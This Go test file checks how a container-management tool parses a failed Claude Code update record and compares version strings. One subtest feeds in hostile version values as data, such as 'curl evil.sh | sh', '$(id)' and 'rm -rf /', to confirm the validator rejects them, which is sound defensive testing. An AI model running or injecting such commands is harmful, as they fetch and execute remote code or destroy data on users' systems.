package profile_test

import (
	"os"
	"testing"

	"github.com/lestrrat-go/ccc/internal/config"
	"github.com/stretchr/testify/require"
)

// writeUpdateResult writes what Claude Code writes after a failed self-update.
func writeUpdateResult(t *testing.T, path string, body string) {
	t.Helper()
	require.NoError(t, os.WriteFile(path, []byte(body), 0o600))
}

func TestRequestedClaudeVersion(t *testing.T) {
	t.Run("absent file", func(t *testing.T) {
		s, _ := newStore(t, "work")
		v, err := s.RequestedClaudeVersion("work")
		require.NoError(t, err)
		require.Empty(t, v)
	})

	t.Run("reads version_to from a failed npm-global update", func(t *testing.T) {
		s, _ := newStore(t, "work")
		// Verbatim shape of what the container writes: /usr/local is root-owned,
		// so the in-container updater always fails with no_permissions.
		writeUpdateResult(t, s.UpdateResultPath("work"), `{
  "timestamp":"2026-07-09T10:33:15.956Z",
  "path":"npm-global","outcome":"failed","status":"no_permissions",
  "version_from":"2.1.204","version_to":"2.1.205","error_code":null
}`)

		v, err := s.RequestedClaudeVersion("work")
		require.NoError(t, err)
		require.Equal(t, "2.1.205", v)
	})

	t.Run("malformed json is ignored, not fatal", func(t *testing.T) {
		s, _ := newStore(t, "work")
		writeUpdateResult(t, s.UpdateResultPath("work"), `not json at all`)

		v, err := s.RequestedClaudeVersion("work")
		require.NoError(t, err, "Claude Code's file; a corrupt one must not brick ccc")
		require.Empty(t, v)
	})

	t.Run("missing version_to", func(t *testing.T) {
		s, _ := newStore(t, "work")
		writeUpdateResult(t, s.UpdateResultPath("work"), `{"outcome":"failed"}`)

		v, err := s.RequestedClaudeVersion("work")
		require.NoError(t, err)
		require.Empty(t, v)
	})

	// The signal is "the container tried and could not". A successful record —
	// e.g. the host's own, copied in by `--from ~/.claude` — must not trigger a
	// rebuild, even when it names a newer version.
	t.Run("successful update record is ignored", func(t *testing.T) {
		s, _ := newStore(t, "work")
		writeUpdateResult(t, s.UpdateResultPath("work"),
			`{"outcome":"success","version_from":"2.1.204","version_to":"2.1.205"}`)

		v, err := s.RequestedClaudeVersion("work")
		require.NoError(t, err)
		require.Empty(t, v, "only a failed in-container update is a request to rebuild")
	})

	t.Run("dist-tag is not a pin", func(t *testing.T) {
		s, _ := newStore(t, "work")
		writeUpdateResult(t, s.UpdateResultPath("work"), `{"outcome":"failed","version_to":"latest"}`)

		v, err := s.RequestedClaudeVersion("work")
		require.NoError(t, err)
		require.Empty(t, v, "storing a moving tag would freeze the image forever")
	})

	// The container can write this file. A hostile version_to must never become
	// a build arg; it is ignored rather than fatal, since ccc does not own it.
	// outcome:failed here so the rejection is by the value, not the outcome gate.
	t.Run("hostile version_to is ignored", func(t *testing.T) {
		for _, bad := range []string{
			`{"outcome":"failed","version_to":"2.1.205 && curl evil.sh | sh"}`,
			`{"outcome":"failed","version_to":"$(id)"}`,
			`{"outcome":"failed","version_to":"2.1.205; rm -rf /"}`,
		} {
			s, _ := newStore(t, "work")
			writeUpdateResult(t, s.UpdateResultPath("work"), bad)

			v, err := s.RequestedClaudeVersion("work")
			require.NoError(t, err)
			require.Empty(t, v, "must not surface %s", bad)
		}
	})
}

// A profile seeded with `--from ~/.claude` inherits the host's update record,
// which may name an older version than the profile is pinned to. Adopting it
// would be a silent downgrade, so callers gate on IsNewerClaudeVersion.
func TestIsNewerClaudeVersion(t *testing.T) {
	require.True(t, config.IsNewerClaudeVersion("2.1.205", "2.1.204"))
	require.True(t, config.IsNewerClaudeVersion("2.2.0", "2.1.205"))
	require.True(t, config.IsNewerClaudeVersion("3.0.0", "2.9.9"))

	require.False(t, config.IsNewerClaudeVersion("2.1.204", "2.1.205"), "no downgrade")
	require.False(t, config.IsNewerClaudeVersion("2.1.205", "2.1.205"), "not strictly newer")

	// Unpinned means anything concrete is newer.
	require.True(t, config.IsNewerClaudeVersion("2.1.205", ""))
	require.True(t, config.IsNewerClaudeVersion("2.1.205", "latest"))

	// Unparseable inputs never win.
	require.False(t, config.IsNewerClaudeVersion("latest", "2.1.205"))
	require.False(t, config.IsNewerClaudeVersion("garbage", "2.1.205"))
	require.False(t, config.IsNewerClaudeVersion("2.1", "2.1.205"))
	require.False(t, config.IsNewerClaudeVersion("2.1.205", "garbage"))
}
